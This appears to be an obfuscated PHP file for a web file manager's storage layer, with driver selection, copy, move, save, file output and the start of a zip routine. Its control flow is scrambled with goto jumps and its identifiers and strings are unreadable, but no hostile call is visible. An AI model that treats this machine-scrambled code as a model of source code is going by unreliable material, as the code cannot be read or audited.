<?php
 goto fÉ¨š•¸ÅË; BïÈ• àºË: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f¬Õé†Ì‹, $d­‚á«ªÁÄ) { $C‘»‡åÔªô = self::driverMake($d­‚á«ªÁÄ[0]); if (method_exists($C‘»‡åÔªô, $f¬Õé†Ì‹)) { return @call_user_func_array(array($C‘»‡åÔªô, $f¬Õé†Ì‹), $d­‚á«ªÁÄ); } if (method_exists($C‘»‡åÔªô, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][994])) { return @call_user_func_array(array($C‘»‡åÔªô, $f¬Õé†Ì‹), $d­‚á«ªÁÄ); } else { if (method_exists(self, $f¬Õé†Ì‹)) { return @call_user_func_array(array(self, $f¬Õé†Ì‹), $d­‚á«ªÁÄ); } else { call_user_func_array(array(parent, $f¬Õé†Ì‹), $d­‚á«ªÁÄ); } } } public static function init($Fâ‹ßŸµÙÛ) { return self::driverMake($Fâ‹ßŸµÙÛ); } public static function copy($Cè·’Äëó, $FéµøçêÌç, $b°ì×„™£ = false, $Dï–¨Ğ›‡ = false) { return self::copyMove($Cè·’Äëó, $FéµøçêÌç, $b°ì×„™£, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][492], $Dï–¨Ğ›‡); } public static function move($Aİ¯¨©Óù, $d¨’êß°Ï…, $Fñç“Œ‚È” = false, $b‘ãÅ°æ‘  = false) { return self::copyMove($Aİ¯¨©Óù, $d¨’êß°Ï…, $Fñç“Œ‚È”, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][494], $b‘ãÅ°æ‘ ); } public static function saveFile($BÇÅ¬Ç…®î, $Dğ×¥„êõÔ, $EÈÖƒù•Áï = true) { goto fèÉ°É¯´·; DãËŠŠŠğ’: $CëßÑ†¥ï = $a¦ª„­ë½»->pathFather($Dğ×¥„êõÔ); $Dò©ª³²è = !0; if (!$EÈÖƒù•Áï && self::driverIsSame($A©·Ô¡­¥, $a¦ª„­ë½»)) { $Dò©ª³²è = !1; } goto eÄŠ ¼Ğ†é; eÄŠ ¼Ğ†é: $f·ÌÈŠµ’¹ = self::copyFile($A©·Ô¡­¥, $BÇÅ¬Ç…®î, $a¦ª„­ë½», $CëßÑ†¥ï, $dÃƒîÕÖ§Ñ[$FìêšßÃó[28]], $Dò©ª³²è); if ($c»¢ŞøÎù¹) { $f·ÌÈŠµ’¹ = $c»¢ŞøÎù¹->getPathOuter($f·ÌÈŠµ’¹); } return $f·ÌÈŠµ’¹; goto cÂ±Àºø»; Aó¬¿×ãõ: $a¦ª„­ë½» = self::driverMake($Dğ×¥„êõÔ); $c»¢ŞøÎù¹ = !1; if ($a¦ª„­ë½»->pathParse[$FìêšßÃó[995]]) { $E˜…à õ× = $a¦ª„­ë½»->pathParse[$FìêšßÃó[995]]; $c»¢ŞøÎù¹ = $a¦ª„­ë½»; $a¦ª„­ë½» = self::driverMake($E˜…à õ×); } goto DãËŠŠŠğ’; fèÉ°É¯´·: $FìêšßÃó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÃƒîÕÖ§Ñ = self::info($Dğ×¥„êõÔ); $A©·Ô¡­¥ = self::driverMake($BÇÅ¬Ç…®î); goto Aó¬¿×ãõ; cÂ±Àºø»: } private static function copyMove($CÜ¸½Š´İ, $fÒÀÏá¼ÇÁ, $f¨ÈøÇ±Æ, $DÃÆ¢Õß‚°, $C±à×Á¥§ğ = false) { goto E°´‹ƒÖÌ…; CåˆŒóéÛ: $BÊâ…İÃ = !1; if ($FÂ…Ï„Ó¤æ->pathParse[$a‰¤ï‰èŒ…[995]]) { $fÒÀÏá¼ÇÁ = $FÂ…Ï„Ó¤æ->pathParse[$a‰¤ï‰èŒ…[995]]; $BÊâ…İÃ = $FÂ…Ï„Ó¤æ; $FÂ…Ï„Ó¤æ = self::driverMake($fÒÀÏá¼ÇÁ); } self::check($b½à×–ªÖ–, $CÜ¸½Š´İ, $FÂ…Ï„Ó¤æ, $fÒÀÏá¼ÇÁ); goto d±ò°¯ÆÈå; d±ò°¯ÆÈå: Hook::trigger($a‰¤ï‰èŒ…[72], $b½à×–ªÖ–, $CÜ¸½Š´İ, $FÂ…Ï„Ó¤æ, $fÒÀÏá¼ÇÁ); $a™êßØÛöÀ = self::driverIsSame($b½à×–ªÖ–, $FÂ…Ï„Ó¤æ); if ($a™êßØÛöÀ) { if ($DÃÆ¢Õß‚° == $a‰¤ï‰èŒ…[494] && !method_exists($FÂ…Ï„Ó¤æ, $a‰¤ï‰èŒ…[996]) && trim($fÒÀÏá¼ÇÁ, $a‰¤ï‰èŒ…[8]) == trim($FÂ…Ï„Ó¤æ->pathFather($CÜ¸½Š´İ), $a‰¤ï‰èŒ…[8])) { return $FÂ…Ï„Ó¤æ->getPathOuter($CÜ¸½Š´İ); } if (method_exists($FÂ…Ï„Ó¤æ, $DÃÆ¢Õß‚°)) { return $FÂ…Ï„Ó¤æ->{$DÃÆ¢Õß‚°}($CÜ¸½Š´İ, $fÒÀÏá¼ÇÁ, $f¨ÈøÇ±Æ); } } goto A‰Ö¹ƒ‡™ë; A›’Ò¦«Ã‡: $b½à×–ªÖ– = self::driverMake($CÜ¸½Š´İ); $FÂ…Ï„Ó¤æ = self::driverMake($fÒÀÏá¼ÇÁ); $EÅ–ºáÄ‘Ä = $DÃÆ¢Õß‚° == $a‰¤ï‰èŒ…[494]; goto CåˆŒóéÛ; A‰Ö¹ƒ‡™ë: $cëÏñ‹äñÀ = $b½à×–ªÖ–->isFile($CÜ¸½Š´İ); if (!$cëÏñ‹äñÀ && $FÂ…Ï„Ó¤æ->getType() == $a‰¤ï‰èŒ…[688] && $b½à×–ªÖ–->getType() == $a‰¤ï‰èŒ…[102]) { $e½¶Á‡ĞËƒ = $FÂ…Ï„Ó¤æ->copyFolderFromIO($b½à×–ªÖ–, $CÜ¸½Š´İ, $fÒÀÏá¼ÇÁ, $f¨ÈøÇ±Æ, $EÅ–ºáÄ‘Ä, $C±à×Á¥§ğ); } else { $e½¶Á‡ĞËƒ = self::copyPath($b½à×–ªÖ–, $CÜ¸½Š´İ, $FÂ…Ï„Ó¤æ, $fÒÀÏá¼ÇÁ, $f¨ÈøÇ±Æ, $EÅ–ºáÄ‘Ä, $cëÏñ‹äñÀ, $C±à×Á¥§ğ); } if ($e½¶Á‡ĞËƒ && $EÅ–ºáÄ‘Ä) { $b½à×–ªÖ–->remove($CÜ¸½Š´İ); } goto FªÀùñ¨§·; E°´‹ƒÖÌ…: $a‰¤ï‰èŒ… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CÜ¸½Š´İ || $CÜ¸½Š´İ == $a‰¤ï‰èŒ…[8] || !$fÒÀÏá¼ÇÁ) { return !1; } ignore_timeout(); goto A›’Ò¦«Ã‡; FªÀùñ¨§·: if ($BÊâ…İÃ) { $e½¶Á‡ĞËƒ = $BÊâ…İÃ->getPathOuter($e½¶Á‡ĞËƒ); } return $e½¶Á‡ĞËƒ; goto aöê†«ù«Š; aöê†«ù«Š: } private static function check($cÖ§¨Ğ„Ç‚, $FÖÀˆßö’Á, $a ³·‹®²Ø, &$BßæÊ‡Â ¾) { $cçøÈÑÓå› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (self::driverIsSame($cÖ§¨Ğ„Ç‚, $a ³·‹®²Ø) && $cÖ§¨Ğ„Ç‚->isFolder($FÖÀˆßö’Á) && $cÖ§¨Ğ„Ç‚->isParentOf($FÖÀˆßö’Á, $BßæÊ‡Â ¾)) { show_json(LNG($cçøÈÑÓå›[997]), !1); } if (!$cÖ§¨Ğ„Ç‚->exist($FÖÀˆßö’Á)) { show_json(LNG($cçøÈÑÓå›[101]), !1); } } private static function copyPath($bÓŒ˜ãÁ, $F§‘²‹¨ªÓ, $a§Ö‡™“ç, $AÓÚºæï‹Í, $aœà™ÜÊœ›, $Dî±Ó‡è, $C²ÚÅĞ†à, $dƒèÍª¶–É = false) { goto e²‡¾•¾˜İ; e²‡¾•¾˜İ: $BìïâŠ¸ù– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d”¡ÂÛã‰ = $dƒèÍª¶–É ? $dƒèÍª¶–É : $bÓŒ˜ãÁ->getPathName($bÓŒ˜ãÁ->pathThis($F§‘²‹¨ªÓ)); if ($aœà™ÜÊœ›) { $A™„—İõµá = $a§Ö‡™“ç->fileNameExist($AÓÚºæï‹Í, $d”¡ÂÛã‰); $d”¡ÂÛã‰ = $a§Ö‡™“ç->fileNameAuto($AÓÚºæï‹Í, $d”¡ÂÛã‰, $aœà™ÜÊœ›, !$C²ÚÅĞ†à); $aœà™ÜÊœ› = $A™„—İõµá ? $aœà™ÜÊœ› : !1; } goto bºø…²ÀİÁ; d…ßƒÙ¹ïÂ: $EäŒ¦ÕÂ›Ò = array_merge($FÒóŸ÷„—[$BìïâŠ¸ù–[73]], $FÒóŸ÷„—[$BìïâŠ¸ù–[74]]); foreach ($EäŒ¦ÕÂ›Ò as $FÈåë¹¹‹ñ) { $AêãÀÓ®…Ò = $FÈåë¹¹‹ñ[$BìïâŠ¸ù–[29]] == $BìïâŠ¸ù–[167]; $F§‘²‹¨ªÓ = $bÓŒ˜ãÁ->getPathInner($FÈåë¹¹‹ñ[$BìïâŠ¸ù–[75]]); $f©Ï¨¼„”Ì = self::copyPath($bÓŒ˜ãÁ, $F§‘²‹¨ªÓ, $a§Ö‡™“ç, $AÓÚºæï‹Í, $aœà™ÜÊœ›, $Dî±Ó‡è, $AêãÀÓ®…Ò); if (!$f©Ï¨¼„”Ì) { write_log($BìïâŠ¸ù–[998] . $F§‘²‹¨ªÓ . $BìïâŠ¸ù–[999] . $AÓÚºæï‹Í, $BìïâŠ¸ù–[1000]); } } return $Eî– æßàÃ; goto EÄÁË¤İœ; EöáÕ×î‘™: $Eî– æßàÃ = $a§Ö‡™“ç->mkdir($a§Ö‡™“ç->getPath($c¸ÓáµÚˆÊ)); $AÓÚºæï‹Í = $a§Ö‡™“ç->getPathInner($Eî– æßàÃ); $FÒóŸ÷„— = $bÓŒ˜ãÁ->listPath($F§‘²‹¨ªÓ, !0); goto d…ßƒÙ¹ïÂ; bºø…²ÀİÁ: if ($C²ÚÅĞ†à) { return self::copyFile($bÓŒ˜ãÁ, $F§‘²‹¨ªÓ, $a§Ö‡™“ç, $AÓÚºæï‹Í, $d”¡ÂÛã‰, $Dî±Ó‡è); } if ($aœà™ÜÊœ› == REPEAT_RENAME_FOLDER) { $aœà™ÜÊœ› = !1; } $c¸ÓáµÚˆÊ = rtrim($AÓÚºæï‹Í, $BìïâŠ¸ù–[8]) . $BìïâŠ¸ù–[8] . $d”¡ÂÛã‰; goto EöáÕ×î‘™; EÄÁË¤İœ: } private static function copyFile($EÄ¨‚øøÌ†, $bËÓÑ„”ƒ, $AÃá ¡µ², $dè²§™Ÿæ×, $D‘æ½‘£òÇ, $f—‹óÈˆô) { goto EÛ—‰›ô¶´; Fª×«•…·: $aïàÖ‘ÑÇ’ = $EÄ¨‚øøÌ†->iconvApp($aïàÖ‘ÑÇ’); $e³ÃƒÔÕÔˆ = $AÃá ¡µ²->upload($dè²§™Ÿæ×, $aïàÖ‘ÑÇ’, $f—‹óÈˆô); self::remove($Dµí‹ÛáÒÊ . $Eõ×ƒÄİøŞ); goto Fƒ¯öİ‹; Fƒ¯öİ‹: Hook::trigger($e»‚…Şª…à[1003], $EÄ¨‚øøÌ†, $bËÓÑ„”ƒ, $AÃá ¡µ², $dè²§™Ÿæ×, $D‘æ½‘£òÇ, $e³ÃƒÔÕÔˆ); return $e³ÃƒÔÕÔˆ; goto Aì¦Á…Û¯İ; C„×øÀªÀ: Hook::trigger($e»‚…Şª…à[1002], $EÄ¨‚øøÌ†, $bËÓÑ„”ƒ, $AÃá ¡µ², $dè²§™Ÿæ×, $D‘æ½‘£òÇ, $Eõ×ƒÄİøŞ); if (self::driverIsSame($EÄ¨‚øøÌ†, $AÃá ¡µ²)) { if ($f—‹óÈˆô) { $e³ÃƒÔÕÔˆ = $AÃá ¡µ²->moveFile($bËÓÑ„”ƒ, $dè²§™Ÿæ×); } else { $e³ÃƒÔÕÔˆ = $AÃá ¡µ²->copyFile($bËÓÑ„”ƒ, $dè²§™Ÿæ×); } Hook::trigger($e»‚…Şª…à[1003], $EÄ¨‚øøÌ†, $bËÓÑ„”ƒ, $AÃá ¡µ², $dè²§™Ÿæ×, $D‘æ½‘£òÇ, $e³ÃƒÔÕÔˆ); return $e³ÃƒÔÕÔˆ; } $Dµí‹ÛáÒÊ = TEMP_FILES; goto eÅ£ñîå­; eÅ£ñîå­: mk_dir($Dµí‹ÛáÒÊ); $aïàÖ‘ÑÇ’ = $Dµí‹ÛáÒÊ . $Eõ×ƒÄİøŞ; $aïàÖ‘ÑÇ’ = $EÄ¨‚øøÌ†->download($bËÓÑ„”ƒ, $aïàÖ‘ÑÇ’); goto Fª×«•…·; EÛ—‰›ô¶´: $e»‚…Şª…à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dè²§™Ÿæ× = $AÃá ¡µ²->getPath(rtrim($dè²§™Ÿæ×, $e»‚…Şª…à[8]) . $e»‚…Şª…à[8] . $D‘æ½‘£òÇ); $Eõ×ƒÄİøŞ = $e»‚…Şª…à[1001] . time() . rand_string(5); goto C„×øÀªÀ; Aì¦Á…Û¯İ: } public static function pathFather($cÏŠ½óé§é) { $e¼‘ÇÅÔïÚ = IO::init($cÏŠ½óé§é); $E×‡…à‡ = $e¼‘ÇÅÔïÚ->pathFather($e¼‘ÇÅÔïÚ->path); return $e¼‘ÇÅÔïÚ->getPathOuter($E×‡…à‡); } public static function fileOut($BˆÁ¾ÀÆÜ‡, $B‹³™ìÖ = false, $Cí¯¿æç¦ = false, $cÄèÅĞÒ“‚ = '') { $bÕ×Ö Û®‘ = self::driverMake($BˆÁ¾ÀÆÜ‡); if ($bÕ×Ö Û®‘->isFileOutServer()) { return $bÕ×Ö Û®‘->fileOutServer($BˆÁ¾ÀÆÜ‡, $B‹³™ìÖ, $Cí¯¿æç¦, $cÄèÅĞÒ“‚); } return $bÕ×Ö Û®‘->fileOut($BˆÁ¾ÀÆÜ‡, $B‹³™ìÖ, $Cí¯¿æç¦, $cÄèÅĞÒ“‚); } public static function fileOutImage($Aíİ–É£Œ™, $B½‚×…‘ñ = 250) { $C¼á½¼áèÅ = array(250, 600, 1200, 3000); for ($e²æ°ÑŒ·¬ = 0; $e²æ°ÑŒ·¬ < count($C¼á½¼áèÅ); $e²æ°ÑŒ·¬++) { if ($e²æ°ÑŒ·¬ == 0 && $B½‚×…‘ñ <= $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]) { $B½‚×…‘ñ = $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]; break; } else { if ($B½‚×…‘ñ > $C¼á½¼áèÅ[$e²æ°ÑŒ·¬ - 1] && $B½‚×…‘ñ <= $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]) { $B½‚×…‘ñ = $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]; break; } else { if ($e²æ°ÑŒ·¬ == count($C¼á½¼áèÅ) - 1 && $B½‚×…‘ñ > $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]) { $B½‚×…‘ñ = $C¼á½¼áèÅ[$e²æ°ÑŒ·¬]; break; } } } } $B®…³ğ•• = self::driverMake($Aíİ–É£Œ™); if ($B®…³ğ••->isFileOutServer()) { return $B®…³ğ••->fileOutImageServer($Aíİ–É£Œ™, $B½‚×…‘ñ); } return $B®…³ğ••->fileOutImage($Aíİ–É£Œ™, $B½‚×…‘ñ); } private static function driverIsSame($d±©ÊÛ”öÒ, $a§½‡±õù) { goto AØÛØÈæ‹Ø; E…„¶‡—œà: if ($d±©ÊÛ”öÒ->pathDriver == $a§½‡±õù->pathDriver) { return !0; } return !1; goto eŠôöËØ”; d›ŒßˆŒÑç: if ($aÜÕ³í”çÁ != $Eµ²Ú¹…¨Ô) { return !1; } if ($aÜÕ³í”çÁ == $E‚áâÛÖ[688]) { return !0; } if ($aÜÕ³í”çÁ == $E‚áâÛÖ[102]) { return !0; } goto E…„¶‡—œà; AØÛØÈæ‹Ø: $E‚áâÛÖ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÜÕ³í”çÁ = $d±©ÊÛ”öÒ->getType(); $Eµ²Ú¹…¨Ô = $a§½‡±õù->getType(); goto d›ŒßˆŒÑç; eŠôöËØ”: } public static function copyUpdate($f©ˆ‰®¶½ô, $dØ¢¼®¥Õ‚) { goto Bğ¬½Í¡; eÀ„ĞÍÇ†: $Eæˆ—¥‰¥Æ = array(); foreach ($fÈÖ³‹Â¡· as $e„½›¯„õÎ => $BÁõ‘¯™¾‚) { if (isset($F¡¨ÕİÁ¿[$e„½›¯„õÎ])) { if ($BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[76]] == 1) { continue; } if ($F¡¨ÕİÁ¿[$e„½›¯„õÎ][$aƒĞÖ¥¹’™[77]] == $BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[77]]) { continue; } } if ($BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[76]] == 1) { $Eæˆ—¥‰¥Æ[] = $dØ¢¼®¥Õ‚ . $aƒĞÖ¥¹’™[8] . $e„½›¯„õÎ; continue; } $cÄ©ô¦àï« = strstr(trim($e„½›¯„õÎ, $aƒĞÖ¥¹’™[8]), $aƒĞÖ¥¹’™[8]) ? get_path_father($e„½›¯„õÎ) : $aƒĞÖ¥¹’™[33]; $E§‹éïÑ¶Ú[] = array($aƒĞÖ¥¹’™[1004] => $BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[75]], $aƒĞÖ¥¹’™[1005] => rtrim($dØ¢¼®¥Õ‚, $aƒĞÖ¥¹’™[8]) . $aƒĞÖ¥¹’™[8] . $cÄ©ô¦àï«, $aƒĞÖ¥¹’™[1006] => $BÁõ‘¯™¾‚); } $EİÂ­¦ŞÀ± = array($aƒĞÖ¥¹’™[167] => $E§‹éïÑ¶Ú, $aƒĞÖ¥¹’™[76] => $Eæˆ—¥‰¥Æ); goto eæ¯éÉíÒ¡; Bğ¬½Í¡: $aƒĞÖ¥¹’™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!IO::exist($f©ˆ‰®¶½ô)) { return !1; } if (!IO::exist($dØ¢¼®¥Õ‚)) { IO::mkdir($dØ¢¼®¥Õ‚); } goto AËÄÔÍÆ´ê; eæ¯éÉíÒ¡: Hook::trigger($aƒĞÖ¥¹’™[1007], $f©ˆ‰®¶½ô, $dØ¢¼®¥Õ‚, $EİÂ­¦ŞÀ±); foreach ($Eæˆ—¥‰¥Æ as $BÁõ‘¯™¾‚) { IO::mkdir($BÁõ‘¯™¾‚); } foreach ($E§‹éïÑ¶Ú as $BÁõ‘¯™¾‚) { IO::copy($BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[1004]], $BÁõ‘¯™¾‚[$aƒĞÖ¥¹’™[1005]], REPEAT_REPLACE); } goto dâ¬¿ÑšÅî; AËÄÔÍÆ´ê: $fÈÖ³‹Â¡· = self::_listAll($f©ˆ‰®¶½ô); $F¡¨ÕİÁ¿ = self::_listAll($dØ¢¼®¥Õ‚); $E§‹éïÑ¶Ú = array(); goto eÀ„ĞÍÇ†; dâ¬¿ÑšÅî: } private static function _listAll($BØÑÑ¯İî¡) { $aİá¢‡³–Ÿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BØÑÑ¯İî¡ = KodIO::clear($BØÑÑ¯İî¡); $a¤˜å‰É¥¾ = IO::listAll($BØÑÑ¯İî¡); foreach ($a¤˜å‰É¥¾ as &$e„ƒò«‚Ã¾) { $Fßğâõœ—„ = substr($e„ƒò«‚Ã¾[$aİá¢‡³–Ÿ[75]], strlen($BØÑÑ¯İî¡)); $e„ƒò«‚Ã¾[$aİá¢‡³–Ÿ[1008]] = trim($Fßğâõœ—„, $aİá¢‡³–Ÿ[8]); } unset($e„ƒò«‚Ã¾); return array_to_keyvalue($a¤˜å‰É¥¾, $aİá¢‡³–Ÿ[1008]); } public static function fileSubstr($FÓõ¤Œ¶, $F•´Ç˜„†, $b¤¯ÛËƒŸ = false) { goto Cß”ÖæÂå¬; FÏùßÈŒÑ: if ($F•´Ç˜„† + $b¤¯ÛËƒŸ > $D¡ƒ‹Ùó‡) { $b¤¯ÛËƒŸ = $D¡ƒ‹Ùó‡ - $F•´Ç˜„†; } if ($b¤¯ÛËƒŸ <= 0) { return $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]; } if ($F•´Ç˜„† < 0 || $F•´Ç˜„† >= $D¡ƒ‹Ùó‡ || $b¤¯ÛËƒŸ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\122\x65\x61\144\40\145\162\x72\x6f\x72\41\40\x73\164\141\162\164\x3d{$F•´Ç˜„†}\x3b\x6c\x65\x6e\147\x74\x68\75{$b¤¯ÛËƒŸ}\73\x20\163\151\172\x65\75{$D¡ƒ‹Ùó‡}\x3b"); } goto E”ÙŞÈÎÈÀ; Cß”ÖæÂå¬: $DçÉ¼îë–” = self::driverMake($FÓõ¤Œ¶); $D¡ƒ‹Ùó‡ = $DçÉ¼îë–”->size($FÓõ¤Œ¶); $AÕß®Éß´‹ = $F•´Ç˜„†; goto dæ¹«Õ‡Ş; E”ÙŞÈÎÈÀ: return $DçÉ¼îë–”->fileSubstr($FÓõ¤Œ¶, $F•´Ç˜„†, $b¤¯ÛËƒŸ); goto f×¢› ‘»—; dæ¹«Õ‡Ş: $DŒª‰ÛŒ×â = $b¤¯ÛËƒŸ; if ($F•´Ç˜„† < 0) { $F•´Ç˜„† = $D¡ƒ‹Ùó‡ + $F•´Ç˜„†; } if ($b¤¯ÛËƒŸ === !1) { $b¤¯ÛËƒŸ = $D¡ƒ‹Ùó‡ - $F•´Ç˜„†; } goto FÏùßÈŒÑ; f×¢› ‘»—: } private static function driverMake(&$F¥Ä´Û£¬) { goto eÓÈ‡ÔÌº‘; eÓÈ‡ÔÌº‘: $a°¾¦©“® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÔÉâõë = KodIO::parse($F¥Ä´Û£¬); if (!self::$driverListSystem) { $dÊì°ÚÏ‘º = Model($a°¾¦©“®[697])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dÊì°ÚÏ‘º, $a°¾¦©“®[367]); } goto fÚ¬ÁÊØ”©; cïºï¦ Åâ: return $aÌË†·Œí; goto e÷á·šÕì; fÚ¬ÁÊØ”©: if ($dÔÉâõë[$a°¾¦©“®[29]] == KodIO::KOD_IO && !self::$driverListSystem[$dÔÉâõë[$a°¾¦©“®[367]]]) { return !1; } $F¥Ä´Û£¬ = $dÔÉâõë[$a°¾¦©“®[1009]]; $aÌË†·Œí = self::driverGet($dÔÉâõë, $F¥Ä´Û£¬); goto cïºï¦ Åâ; e÷á·šÕì: } private static function driverGet($BÙ…íİó², &$bº¸õÅÉè) { goto B‚İ©©‹ÙÀ; cÇ¸¶ƒ¾‹³: $eÔèé×»ÌÛ = self::$driverCache[$aóù•‚”Ò]; $eÔèé×»ÌÛ->pathDriver = $CÖˆÌÓà±ƒ; $eÔèé×»ÌÛ->pathBase = $Ağ˜Ë®¤[33]; goto c£ŸË©–»; Aà­éŸÚ¬¯: $eÔèé×»ÌÛ->path = $bº¸õÅÉè; return $eÔèé×»ÌÛ; goto Däİ´ßßˆÑ; B‚İ©©‹ÙÀ: $Ağ˜Ë®¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÖˆÌÓà±ƒ = $BÙ…íİó²[$Ağ˜Ë®¤[1010]]; $A©Í‹’æÌŠ = $BÙ…íİó²[$Ağ˜Ë®¤[367]]; goto f…°ãÔ…Œ¤; f…°ãÔ…Œ¤: switch ($BÙ…íİó²[$Ağ˜Ë®¤[29]]) { case KodIO::KOD_IO: $A«ŸİƒÃæà = self::$driverListSystem[$A©Í‹’æÌŠ]; break; case KodIO::KOD_SOURCE: $bº¸õÅÉè = $A©Í‹’æÌŠ . $bº¸õÅÉè; $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1012], $Ağ˜Ë®¤[6] => $BÙ…íİó²); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D¹Ê´·†ÔÈ = $GLOBALS[$Ağ˜Ë®¤[1013]]; self::$driverListUser = array_to_keyvalue($D¹Ê´·†ÔÈ, $Ağ˜Ë®¤[367]); } $A«ŸİƒÃæà = self::$driverListUser[$A©Í‹’æÌŠ]; break; case KodIO::KOD_SHARE_LINK: $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1014], $Ağ˜Ë®¤[6] => $BÙ…íİó²); $FŠ‘Í¯—êø = Action($Ağ˜Ë®¤[1015])->sharePathInfo($BÙ…íİó²[$Ağ˜Ë®¤[75]]); $bº¸õÅÉè = $FŠ‘Í¯—êø[$Ağ˜Ë®¤[369]]; if (!$FŠ‘Í¯—êø[$Ağ˜Ë®¤[369]]) { $CÌîÃ¿˜î¨ = Model($Ağ˜Ë®¤[538])->getInfo($FŠ‘Í¯—êø[$Ağ˜Ë®¤[441]]); $bº¸õÅÉè = KodIO::clear($CÌîÃ¿˜î¨[$Ağ˜Ë®¤[1016]] . $BÙ…íİó²[$Ağ˜Ë®¤[1009]]); $BÙ…íİó²[$Ağ˜Ë®¤[439]] = $CÌîÃ¿˜î¨; $BÙ…íİó²[$Ağ˜Ë®¤[995]] = $bº¸õÅÉè; $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1017], $Ağ˜Ë®¤[6] => $BÙ…íİó²); } break; case KodIO::KOD_SHARE_ITEM: $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1018], $Ağ˜Ë®¤[6] => $BÙ…íİó²); $CÌîÃ¿˜î¨ = Model($Ağ˜Ë®¤[538])->getInfo($BÙ…íİó²[$Ağ˜Ë®¤[367]]); if ($CÌîÃ¿˜î¨[$Ağ˜Ë®¤[369]] == $Ağ˜Ë®¤[470]) { $bº¸õÅÉè = KodIO::clear($CÌîÃ¿˜î¨[$Ağ˜Ë®¤[1016]] . $BÙ…íİó²[$Ağ˜Ë®¤[1009]]); $BÙ…íİó²[$Ağ˜Ë®¤[439]] = $CÌîÃ¿˜î¨; $BÙ…íİó²[$Ağ˜Ë®¤[995]] = $bº¸õÅÉè; $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1019], $Ağ˜Ë®¤[6] => $BÙ…íİó²); } else { if (!$bº¸õÅÉè) { $bº¸õÅÉè = $CÌîÃ¿˜î¨[$Ağ˜Ë®¤[369]]; } } break; default: $bº¸õÅÉè = $BÙ…íİó²[$Ağ˜Ë®¤[75]]; $A«ŸİƒÃæà = array($Ağ˜Ë®¤[1011] => $Ağ˜Ë®¤[1020]); break; } $aóù•‚”Ò = $BÙ…íİó²[$Ağ˜Ë®¤[75]]; if (!isset(self::$driverCache[$aóù•‚”Ò])) { $E§Ú¡¼½èØ = strtolower($A«ŸİƒÃæà[$Ağ˜Ë®¤[90]]); $dÍÜ†œ¯”– = $GLOBALS[$Ağ˜Ë®¤[6]][$Ağ˜Ë®¤[84]][$Ağ˜Ë®¤[755]]; $c¯·­êÔ = $Ağ˜Ë®¤[71] . (isset($dÍÜ†œ¯”–[$E§Ú¡¼½èØ]) ? $dÍÜ†œ¯”–[$E§Ú¡¼½èØ] : ucfirst($E§Ú¡¼½èØ)); if (!class_exists($c¯·­êÔ)) { show_json("{$c¯·­êÔ}\40\x6e\157\x74\x20\145\170\x69\x73\164\x73\41", !1); } $cöšŞ¥‹¥İ = isset($A«ŸİƒÃæà[$Ağ˜Ë®¤[6]]) ? $A«ŸİƒÃæà[$Ağ˜Ë®¤[6]] : !1; self::$driverCache[$aóù•‚”Ò] = new $c¯·­êÔ($cöšŞ¥‹¥İ); } goto cÇ¸¶ƒ¾‹³; c£ŸË©–»: if (isset($A«ŸİƒÃæà[$Ağ˜Ë®¤[6]][$Ağ˜Ë®¤[1021]])) { $eÔèé×»ÌÛ->pathBase = rtrim($A«ŸİƒÃæà[$Ağ˜Ë®¤[6]][$Ağ˜Ë®¤[1021]], $Ağ˜Ë®¤[8]) . $Ağ˜Ë®¤[8]; $bº¸õÅÉè = $eÔèé×»ÌÛ->pathBase . ltrim($bº¸õÅÉè, $Ağ˜Ë®¤[8]); } $bº¸õÅÉè = $eÔèé×»ÌÛ->getPath($bº¸õÅÉè); if (isset($BÙ…íİó²[$Ağ˜Ë®¤[995]])) { $bº¸õÅÉè = $BÙ…íİó²[$Ağ˜Ë®¤[995]]; } goto Aà­éŸÚ¬¯; Däİ´ßßˆÑ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $D¢ŞÛåè—; if (!$D¢ŞÛåè—) { $EŠµ¼Èï‘Å = IO::init($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8]); } return $EŠµ¼Èï‘Å; } private static function iconvSystem($a¦¤ÄùèÑë) { return self::local()->iconvSystem($a¦¤ÄùèÑë); } private static function iconvApp($fƒæ¶†Ş†) { return self::local()->iconvApp($fƒæ¶†Ş†); } public static function zip($d—•¦»°ôª, $F“²¢Ò• = "\172\151\160", $b¸ä»¹Ü½Æ = '', $Cò°µ ‚— = REPEAT_RENAME) { goto f¤‰÷ã÷ç; añ²Ã÷ªİ: if ($b¸ä»¹Ü½Æ || !$fª¶²ïÂÂ‡) { if ($fª¶²ïÂÂ‡ && strstr($fª¶²ïÂÂ‡, 